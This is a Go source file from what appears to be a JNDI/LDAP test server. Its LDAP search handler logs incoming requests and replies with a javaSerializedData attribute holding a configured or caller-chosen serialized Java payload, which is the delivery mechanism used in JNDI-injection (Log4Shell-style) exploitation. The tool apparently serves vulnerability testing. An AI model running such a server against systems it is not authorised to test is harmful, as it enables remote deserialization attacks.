package routes

import (
	"github.com/lor00x/goldap/message"
	javaser "github.com/rakuten-tech/jndi-ldap-test-server/java/serialization"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
	"github.com/vjeantet/ldapserver"
	"strings"
)

func handleSearch(w ldapserver.ResponseWriter, m *ldapserver.Message) {
	r := m.GetSearchRequest()
	baseDN := string(r.BaseObject())
	payload := getExploitPayload(baseDN)

	log.Info().
		Str("component", "ldap").
		Str("event", "request").
		Str("client_ip", m.Client.Addr().String()).
		Dict("request", zerolog.Dict().
			Str("type", "search").
			Str("base_dn", string(r.BaseObject())).
			Str("filter", r.FilterString()).
			Array("attributes", arrayOfLdapStrings(r.Attributes())).
			Int("time_limit", r.TimeLimit().Int()),
		).
		Msg("Incoming LDAP Search Request")

	e := ldapserver.NewSearchResultEntry("")
	e.AddAttribute("javaClassName", "foo")
	e.AddAttribute("javaSerializedData", message.AttributeValue(payload))
	w.Write(e)

	res := ldapserver.NewSearchResultDoneResponse(ldapserver.LDAPResultSuccess)
	w.Write(res)
}

func arrayOfLdapStrings(ldapStrings []message.LDAPString) *zerolog.Array {
	arr := zerolog.Arr()
	for _, s := range ldapStrings {
		arr.Str(string(s))
	}
	return arr
}

var stringPayloadPrefix = "Payload/String/"

func getExploitPayload(baseDN string) []byte {
	// Use custom dynamic payload if allowed and requested
	if strings.HasPrefix(baseDN, stringPayloadPrefix) && exploitSettings.AllowDynamicPayloads.String {
		return javaser.EncodeString(baseDN[len(stringPayloadPrefix):])
	}

	return exploitSettings.DefaultPayload
}